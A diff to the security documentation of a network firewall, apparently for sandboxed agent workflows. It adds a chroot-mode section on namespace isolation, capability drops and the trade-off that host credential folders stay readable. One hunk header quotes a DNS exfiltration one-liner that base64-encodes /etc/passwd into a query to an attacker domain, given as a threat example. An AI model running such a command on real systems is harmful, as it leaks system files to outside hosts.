@@ -212,7 +212,7 @@ Only enable SSL Bump when you specifically need URL path filtering. For most use
 ### SSL Bump Threat Considerations
 
 **What SSL Bump enables:**
-- Fine-grained access control (e.g., allow only `/githubnext/*` paths)
+- Fine-grained access control (e.g., allow only `/myorg/*` paths)
 - Better audit logging with full URLs
 - Detection of path-based exfiltration attempts
 
@@ -279,6 +279,57 @@ nslookup $(cat /etc/passwd | base64).attacker.com attacker-dns-server.com
 :::note[Remaining risk]
 DNS tunneling through the *allowed* DNS servers (encoding data in query names to attacker-controlled domains) is still theoretically possible, as the trusted DNS server will recursively resolve any domain. For high-security environments, consider using a DNS filtering service or monitoring DNS query logs for anomalies.
 :::
+
+---
+
+## Chroot Mode Security
+
+When `--enable-chroot` is enabled, user commands run inside a `chroot /host` jail, providing transparent access to host binaries while maintaining network isolation.
+
+### Why Chroot Doesn't Break Network Isolation
+
+A common question: "If the command runs in the host filesystem, doesn't it escape the firewall?"
+
+**No.** Linux namespaces operate independently:
+
+| Namespace | Affected by chroot? | Implication |
+|-----------|---------------------|-------------|
+| **Network** | NO | iptables rules still apply |
+| **PID** | NO | Process isolation maintained |
+| **Mount** | Partially | Filesystem view changes, isolation preserved |
+| **User** | NO | Still runs as non-root user |
+
+`chroot` only changes which filesystem tree is visible. It does NOT:
+- Escape Docker's network namespace
+- Bypass iptables rules
+- Provide access to host's network stack
+
+### Chroot Security Controls
+
+| Control | Mechanism |
+|---------|-----------|
+| **Capability drop** | `CAP_NET_ADMIN` and `CAP_SYS_CHROOT` dropped before user command |
+| **Docker socket hidden** | Mounted as `/dev/null` to prevent `docker run` escape |
+| **Selective mounts** | System paths read-only, only `$HOME` and `/tmp` writable |
+| **User mapping** | Runs as host user (by UID), not root |
+
+### Chroot Trade-offs
+
+| Aspect | Impact | Mitigation |
+|--------|--------|------------|
+| **Host $HOME access** | Can read `.ssh/`, `.aws/` | Use env vars for secrets, not files |
+| **DNS override** | Host's resolv.conf modified | Backup created, restored on exit |
+
+### When to Use Chroot Mode
+
+| Scenario | Recommendation |
+|----------|----------------|
+| GitHub Actions with pre-installed tools | Use `--enable-chroot` |
+| Need host-specific binaries (Python, Go) | Use `--enable-chroot` |
+| Want full container isolation | Use default mode |
+| Sensitive secrets in home directory | Consider default mode |
+
+For complete documentation, see [Chroot Mode](/gh-aw-firewall/docs/chroot-mode/).
 
 ---
 
